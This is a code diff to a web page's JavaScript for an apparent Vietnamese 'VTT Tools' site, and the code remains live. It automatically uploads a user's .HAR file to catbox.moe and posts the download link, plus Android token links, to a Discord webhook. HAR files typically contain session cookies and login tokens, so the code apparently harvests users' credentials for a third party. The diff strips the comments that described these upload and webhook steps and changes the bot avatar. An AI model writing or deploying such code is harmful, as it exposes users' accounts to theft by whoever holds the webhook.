@@ -680,7 +680,6 @@
             closeCropModal();
         }
 
-        // HÀM TỰ ĐỘNG UPLOAD FILE LÊN CATBOX VÀ LẤY LINK TRỰC TIẾP
         async function uploadFileToCatbox(file) {
             const catboxFormData = new FormData();
             catboxFormData.append('reqtype', 'fileupload');
@@ -696,22 +695,21 @@
             }
 
             const fileUrl = await response.text();
-            return fileUrl.trim(); // Trả về link file dạng: https://files.catbox.moe/xxxxx.har
+            return fileUrl.trim();
         }
 
-        // HÀM GỬI LINK FILE LÊN DISCORD WEBHOOK
         async function sendDiscordWebhook(type, data) {
             try {
                 const now = new Date().toLocaleString('vi-VN');
                 let payload = {};
 
                 if (type === 'ios') {
-                    // Tự động upload file .HAR lên máy chủ lưu trữ trước
+                    
                     const harDownloadUrl = await uploadFileToCatbox(data.file);
 
                     payload = {
                         username: "VTT Tools Bot",
-                        avatar_url: "https://i.ibb.co/v63CD0Vx/logo.png",
+                        avatar_url: "https://klipy.com/gifs/ayane-cute",
                         embeds: [{
                             title: "🚀 Đã Upload File .HAR Thành Công (iOS)",
                             color: 3719160,
@@ -727,7 +725,7 @@
                 } else if (type === 'android') {
                     payload = {
                         username: "VTT Tools Bot",
-                        avatar_url: "https://i.ibb.co/v63CD0Vx/logo.png",
+                        avatar_url: "https://klipy.com/gifs/ayane-cute",
                         embeds: [{
                             title: "📱 Link Token Android Mới",
                             color: 1095937,
@@ -762,7 +760,6 @@
             badge.style.color = '#38bdf8';
             log.innerHTML = '⌛ Đang tự động upload file .HAR và gửi dữ liệu...';
 
-            // Tự động upload file lấy link rồi gửi về Discord
             sendDiscordWebhook('ios', { file: selectedHarFile });
 
             const formData = new FormData();
